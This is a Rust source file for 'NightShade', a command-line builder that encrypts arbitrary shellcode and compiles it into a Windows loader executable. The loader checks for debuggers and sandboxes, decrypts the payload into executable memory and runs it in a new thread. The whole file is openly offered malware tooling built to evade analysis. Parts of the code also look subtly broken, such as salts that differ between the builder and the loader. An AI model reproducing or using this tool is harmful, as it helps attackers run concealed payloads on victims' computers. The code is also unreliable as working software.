use anyhow::Context;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce, XChaCha20Poly1305,
};
use pbkdf2::pbkdf2_hmac;
use rand::{RngCore, rngs::OsRng};
use sha2::Sha256;
use std::{
    fs,
    io::{self, Write},
    path::Path,
    process::Command,
};
use sysinfo::{System, SystemExt};
use base64::encode;

mod anti_analysis {
    use sysinfo::{System, SystemExt};
    use std::time::{Instant, Duration};
    use winapi::um::processthreadsapi::GetCurrentProcessId;
    use winapi::um::psapi::GetProcessMemoryInfo;

    pub fn is_sandbox() -> bool {
        let mut sys = System::new_all();
        sys.refresh_all();
        if sys.cpus().len() < 4 {
            return true;
        }
        if sys.total_memory() < 4_000_000_000 {
            return true;
        }
        let start = Instant::now();
        std::thread::sleep(Duration::from_millis(1000));
        let elapsed = start.elapsed();
        elapsed.as_millis() < 950
    }

    pub fn is_debugged() -> bool {
        unsafe {
            let peb_ptr: *const u8;
            #[cfg(target_arch = "x86_64")]
            asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
            #[cfg(target_arch = "x86")]
            asm!("mov {}, fs:[0x30]", out(reg) peb_ptr);
            let flag = *peb_ptr.add(2);
            flag != 0
        }
    }

    pub fn memory_anomaly() -> bool {
        use winapi::um::psapi::PROCESS_MEMORY_COUNTERS;
        let mut pmc: PROCESS_MEMORY_COUNTERS = unsafe { std::mem::zeroed() };
        let size = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>();
        let result = unsafe {
            GetProcessMemoryInfo(
                GetCurrentProcessId() as *mut _,
                &mut pmc,
                size as u32,
            )
        };
        result != 0 && pmc.WorkingSetSize > 100_000_000
    }
}

struct Config {
    raw_payload: Option<Vec<u8>>,
    payload_path: Option<String>,
    output_name: Option<String>,
    password: Option<String>,
    use_xchacha: bool,
}

fn main() -> anyhow::Result<()> {
    let mut config = Config {
        raw_payload: None,
        payload_path: None,
        output_name: None,
        password: None,
        use_xchacha: false,
    };

    loop {
        writeln!(std::io::stdout(), "\n=== NightShade CLI by EvilWhales 2025 ===")?;
        writeln!(std::io::stdout(), "1) Set raw payload (hex string, e.g. 90 90 90 CC)")?;
        writeln!(std::io::stdout(), "2) Set path to payload file (file.bin)")?;
        writeln!(std::io::stdout(), "3) Set output EXE name")?;
        writeln!(std::io::stdout(), "4) Set encryption password")?;
        writeln!(std::io::stdout(), "5) Toggle XChaCha20 mode (current: {})", if config.use_xchacha { "ON" } else { "OFF" })?;
        writeln!(std::io::stdout(), "6) Build stealth loader")?;
        writeln!(std::io::stdout(), "7) Show current config")?;
        writeln!(std::io::stdout(), "Ctrl+C to exit")?;
        write!(std::io::stdout(), "Enter choice: ")?;
        io::stdout().flush()?;

        let mut choice = String::new();
        io::stdin().read_line(&mut choice)?;
        match choice.trim() {
            "1" => {
                write!(std::io::stdout(), "Enter raw payload as hex bytes separated by spaces: ")?;
                io::stdout().flush()?;
                let mut hex_str = String::new();
                io::stdin().read_line(&mut hex_str)?;
                match parse_hex_string(hex_str.trim()) {
                    Ok(bytes) => {
                        config.raw_payload = Some(bytes);
                        config.payload_path = None;
                        writeln!(std::io::stdout(), "Raw payload set ({} bytes)", config.raw_payload.as_ref().unwrap().len())?;
                    }
                    Err(e) => writeln!(std::io::stdout(), "Failed to parse hex: {}", e)?,
                }
            }
            "2" => {
                write!(std::io::stdout(), "Enter path to payload file: ")?;
                io::stdout().flush()?;
                let mut path = String::new();
                io::stdin().read_line(&mut path)?;
                let path = path.trim().to_string();
                if Path::new(&path).exists() {
                    config.payload_path = Some(path);
                    config.raw_payload = None;
                    writeln!(std::io::stdout(), "Payload file path set.")?;
                } else {
                    writeln!(std::io::stdout(), "File not found.")?;
                }
            }
            "3" => {
                write!(std::io::stdout(), "Enter output EXE filename (must end with .exe): ")?;
                io::stdout().flush()?;
                let mut name = String::new();
                io::stdin().read_line(&mut name)?;
                let name = name.trim().to_string();
                if !name.to_lowercase().ends_with(".exe") {
                    writeln!(std::io::stdout(), "Filename must end with .exe")?;
                } else {
                    config.output_name = Some(name);
                    writeln!(std::io::stdout(), "Output EXE name set.")?;
                }
            }
            "4" => {
                write!(std::io::stdout(), "Enter encryption password (min 12 chars): ")?;
                io::stdout().flush()?;
                let mut pwd = String::new();
                io::stdin().read_line(&mut pwd)?;
                let pwd = pwd.trim().to_string();
                if pwd.len() < 12 {
                    writeln!(std::io::stdout(), "Password too short! Minimum 12 characters.")?;
                } else {
                    config.password = Some(pwd);
                    writeln!(std::io::stdout(), "Password set.")?;
                }
            }
            "5" => {
                config.use_xchacha = !config.use_xchacha;
                writeln!(std::io::stdout(), "XChaCha20 mode: {}", if config.use_xchacha { "ON" } else { "OFF" })?;
            }
            "6" => {
                if config.output_name.is_none() {
                    writeln!(std::io::stdout(), "Set output EXE filename first.")?;
                    continue;
                }
                if config.password.is_none() {
                    writeln!(std::io::stdout(), "Set encryption password first.")?;
                    continue;
                }

                let payload_bytes = if let Some(raw) = &config.raw_payload {
                    raw.clone()
                } else if let Some(path) = &config.payload_path {
                    match fs::read(path) {
                        Ok(b) => b,
                        Err(e) => {
                            writeln!(std::io::stdout(), "Failed to read payload file: {}", e)?;
                            continue;
                        }
                    }
                } else {
                    writeln!(std::io::stdout(), "Set raw payload or payload file path first.")?;
                    continue;
                };

                match build_loader(&payload_bytes, config.output_name.as_ref().unwrap(), config.password.as_ref().unwrap(), config.use_xchacha) {
                    Ok(_) => writeln!(std::io::stdout(), "Successfully built stealth EXE: {}", config.output_name.as_ref().unwrap())?,
                    Err(e) => writeln!(std::io::stdout(), "Build failed: {}", e)?,
                }
            }
            "7" => {
                writeln!(std::io::stdout(), "Current config:")?;
                writeln!(std::io::stdout(), " Raw payload: {} bytes", config.raw_payload.as_ref().map(|v| v.len()).unwrap_or(0))?;
                writeln!(std::io::stdout(), " Payload file path: {}", config.payload_path.as_deref().unwrap_or("<none>"))?;
                writeln!(std::io::stdout(), " Output EXE name: {}", config.output_name.as_deref().unwrap_or("<none>"))?;
                writeln!(std::io::stdout(), " Password: {}", if config.password.is_some() { "<set>" } else { "<none>" })?;
                writeln!(std::io::stdout(), " XChaCha20 mode: {}", if config.use_xchacha { "ON" } else { "OFF" })?;
            }
            other => writeln!(std::io::stdout(), "Unknown choice: {}", other)?,
        }
    }
}

fn parse_hex_string(hex_str: &str) -> Result<Vec<u8>, String> {
    hex_str
        .split_whitespace()
        .map(|b| u8::from_str_radix(b, 16).map_err(|_| format!("Invalid hex byte '{}'", b)))
        .collect()
}

fn derive_key_nonce_from_password(password: &str, use_xchacha: bool) -> ([u8; 32], Vec<u8>) {
    let mut key = [0u8; 32];
    let nonce_size = if use_xchacha { 24 } else { 12 };
    let mut nonce = vec![0u8; nonce_size];
    let salt = encode("NightShadeSalt2025").into_bytes();

    pbkdf2_hmac::<Sha256>(password.as_bytes(), &salt, 150_000, &mut key);

    let mut nonce_source = vec![0u8; 32];
    pbkdf2_hmac::<Sha256>(password.as_bytes(), encode("NonceSalt2025").as_bytes(), 150_000, &mut nonce_source);
    nonce.copy_from_slice(&nonce_source[..nonce_size]);

    (key, nonce)
}

fn build_loader(payload: &[u8], output_name: &str, password: &str, use_xchacha: bool) -> anyhow::Result<()> {
    let (key_bytes, nonce_bytes) = derive_key_nonce_from_password(password, use_xchacha);

    let encrypted = if use_xchacha {
        let cipher = XChaCha20Poly1305::new(Key::from_slice(&key_bytes));
        let nonce = chacha20poly1305::XNonce::from_slice(&nonce_bytes);
        cipher.encrypt(nonce, payload).context("XChaCha20 encryption failed")?
    } else {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(&key_bytes));
        let nonce = Nonce::from_slice(&nonce_bytes);
        cipher.encrypt(nonce, payload).context("ChaCha20 encryption failed")?
    };

    let mask = OsRng.gen::<u8>();
    let obf_key: Vec<u8> = key_bytes.iter().map(|b| b ^ mask).collect();
    let obf_nonce: Vec<u8> = nonce_bytes.iter().map(|b| b ^ mask).collect();
    let obf_password: Vec<u8> = password.as_bytes().iter().map(|b| b ^ (mask ^ 0x55)).collect();

    let loader_src = generate_loader_source(&encrypted, &obf_key, &obf_nonce, &obf_password, mask, use_xchacha);

    fs::create_dir_all("nightshade_build/src")?;
    fs::write("nightshade_build/src/main.rs", loader_src)?;

    let cargo_toml = r#"
[package]
name = "nightshade_loader"
version = "0.2.0"
edition = "2021"

[dependencies]
winapi = { version = "0.3", features = ["memoryapi", "processthreadsapi", "synchapi", "minwindef", "handleapi", "errhandlingapi", "psapi"] }
chacha20poly1305 = "0.10"
pbkdf2 = "0.12"
sha2 = "0.10"
sysinfo = "0.30"
"#;
    fs::write("nightshade_build/Cargo.toml", cargo_toml.trim())?;

    let status = Command::new("cargo")
        .args(&["build", "--release", "--manifest-path", "nightshade_build/Cargo.toml"])
        .status()
        .context("Cargo build failed")?;

    if !status.success() {
        anyhow::bail!("Cargo build failed");
    }

    #[cfg(target_os = "windows")]
    let built_exe = "nightshade_build\\target\\release\\nightshade_loader.exe";
    #[cfg(not(target_os = "windows"))]
    let built_exe = "nightshade_build/target/release/nightshade_loader.exe";

    fs::copy(built_exe, output_name)?;

    Ok(())
}

fn generate_loader_source(
    encrypted_payload: &[u8],
    obf_key: &[u8],
    obf_nonce: &[u8],
    obf_password: &[u8],
    mask: u8,
    use_xchacha: bool,
) -> String {
    let fmt_bytes = |v: &[u8]| -> String {
        v.iter()
            .map(|b| format!("0x{:02X}", b))
            .collect::<Vec<_>>()
            .join(", ")
    };

    let cipher_name = if use_xchacha { "XChaCha20Poly1305" } else { "ChaCha20Poly1305" };
    let nonce_type = if use_xchacha { "XNonce" } else { "Nonce" };
    let nonce_size = if use_xchacha { 24 } else { 12 };

    format!(
r#"
#![allow(non_snake_case, unused_macros)]
use std::ptr;
use std::thread;
use std::time::{{Duration, Instant}};
use winapi::um::processthreadsapi::{{CreateThread, GetCurrentProcessId}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{{MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
use winapi::um::synchapi::Sleep;
use winapi::um::psapi::{{GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS}};
use chacha20poly1305::aead::{{Aead, KeyInit}};
use chacha20poly1305::{{{cipher_name}, Key, {nonce_type}}};
use pbkdf2::pbkdf2_hmac;
use sha2::Sha256;
use sysinfo::{{System, SystemExt}};
use base64::decode;

macro_rules! obfstr {{
    ($s:expr) => {{
        String::from_utf8(decode($s).unwrap()).unwrap()
    }};
}}

fn xor_decrypt(data: &mut [u8], key: u8) {{
    for b in data.iter_mut() {{
        *b ^= key;
    }}
}}

#[cfg(target_arch = "x86_64")]
unsafe fn is_debugged() -> bool {{
    let peb_ptr: *const u8;
    asm!("mov {{}}, gs:[0x60]", out(reg) peb_ptr);
    let flag = *peb_ptr.add(2);
    flag != 0
}}
#[cfg(target_arch = "x86")]
unsafe fn is_debugged() -> bool {{
    let peb_ptr: *const u8;
    asm!("mov {{}}, fs:[0x30]", out(reg) peb_ptr);
    let flag = *peb_ptr.add(2);
    flag != 0
}}

fn is_sandbox() -> bool {{
    let mut sys = System::new_all();
    sys.refresh_all();
    if sys.cpus().len() < 4 || sys.total_memory() < 4_000_000_000 {{
        return true;
    }}
    let start = Instant::now();
    unsafe {{ Sleep(1000); }}
    start.elapsed().as_millis() < 950
}}

fn memory_anomaly() -> bool {{
    let mut pmc: PROCESS_MEMORY_COUNTERS = unsafe {{ std::mem::zeroed() }};
    let size = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>();
    let result = unsafe {{
        GetProcessMemoryInfo(GetCurrentProcessId() as *mut _, &mut pmc, size as u32)
    }};
    result != 0 && pmc.WorkingSetSize > 100_000_000
}}

#[cfg(target_arch = "x86_64")]
unsafe fn syscall_virtualalloc(size: usize) -> *mut u8 {{
    let mut ret: *mut u8;
    asm!(
        "mov r10, rcx",
        "mov eax, 0x18",
        "syscall",
        out("rax") ret,
        in("rcx") ptr::null_mut::<u8>(),
        in("rdx") size,
        options(nostack)
    );
    ret
}}
#[cfg(target_arch = "x86")]
unsafe fn syscall_virtualalloc(size: usize) -> *mut u8 {{
    VirtualAlloc(ptr::null_mut(), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE) as *mut u8
}}

fn main() {{
    let mut obf_key = [ {key} ];
    let mut obf_nonce = [ {nonce} ];
    let mut obf_password = [ {password} ];
    let mask = {mask};

    xor_decrypt(&mut obf_key, mask);
    xor_decrypt(&mut obf_nonce, mask);
    xor_decrypt(&mut obf_password, mask ^ 0x55);

    if unsafe {{ is_debugged() }} || is_sandbox() || memory_anomaly() {{
        std::process::exit(1);
    }}

    let mut runtime_key = [0u8; 32];
    let mut runtime_nonce = [0u8; {nonce_size}];
    pbkdf2_hmac::<Sha256>(
        &obf_password,
        obfstr!("Tm93bmFsb2FkU2FsdDIwMjU=").as_bytes(),
        150_000,
        &mut runtime_key
    );
    pbkdf2_hmac::<Sha256>(
        &obf_password,
        obfstr!("Tm9uY2VTYWx0MjAyNQ==").as_bytes(),
        150_000,
        &mut runtime_nonce
    );

    if runtime_key != obf_key || runtime_nonce != obf_nonce {{
        std::process::exit(1);
    }}

    let cipher = {cipher_name}::new(Key::from_slice(&runtime_key));
    let nonce = {nonce_type}::from_slice(&runtime_nonce);

    let mut encrypted_payload = vec![{payload}];
    let decrypted = cipher.decrypt(nonce, encrypted_payload.as_ref())
        .expect("Payload decryption failed");

    let exec_mem = unsafe {{
        #[cfg(target_arch = "x86_64")]
        {{
            let p = syscall_virtualalloc(decrypted.len());
            if p.is_null() {{
                VirtualAlloc(ptr::null_mut(), decrypted.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) as *mut u8
            }} else {{
                p
            }}
        }}
        #[cfg(not(target_arch = "x86_64"))]
        {{
            VirtualAlloc(ptr::null_mut(), decrypted.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) as *mut u8
        }}
    }};

    if exec_mem.is_null() {{
        std::process::exit(1);
    }}

    unsafe {{
        ptr::copy_nonoverlapping(decrypted.as_ptr(), exec_mem, decrypted.len());
        let handle = CreateThread(ptr::null_mut(), 0, Some(std::mem::transmute(exec_mem)), ptr::null_mut(), 0, ptr::null_mut());
        if handle.is_null() {{
            std::process::exit(1);
        }}
    }}

    thread::sleep(Duration::from_secs(10));
}}
"#,
        key = fmt_bytes(obf_key),
        nonce = fmt_bytes(obf_nonce),
        password = fmt_bytes(obf_password),
        mask = mask,
        payload = fmt_bytes(encrypted_payload),
        cipher_name = cipher_name,
        nonce_type = nonce_type,
        nonce_size = nonce_size,
    )
}